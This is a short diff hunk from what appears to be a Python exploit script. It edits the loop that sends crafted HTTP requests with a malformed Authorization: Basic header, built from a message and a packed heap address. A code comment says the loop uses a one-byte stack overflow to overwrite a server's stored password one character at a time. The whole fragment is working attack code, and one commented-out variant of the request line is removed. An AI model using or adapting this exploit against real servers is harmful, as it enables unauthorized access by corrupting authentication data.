@@ -164,7 +164,6 @@ if __name__ == "__main__":
 	# Since the stack overflow writing with only one byte, we need overwrite the password one char at the time (looping twelve times)
 	#
 	for where in range(0, len(PASSWD)):
-#		OUT = "GET / HTTP/1.0\nAuthorization: Basic {}{}{}\n\n".format(MESSAGE,struct.pack('<L',HEAP_PWD)[:3],"\n") # Must end with '\n' to get 0x00xxyyzz
 		OUT = "GET / HTTP/1.0\nAuthorization: Basic {}{}\n\n".format(MESSAGE,struct.pack('<L',HEAP_PWD)[:3])
 		print "Writing to: {}".format(hex(HEAP_PWD))
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
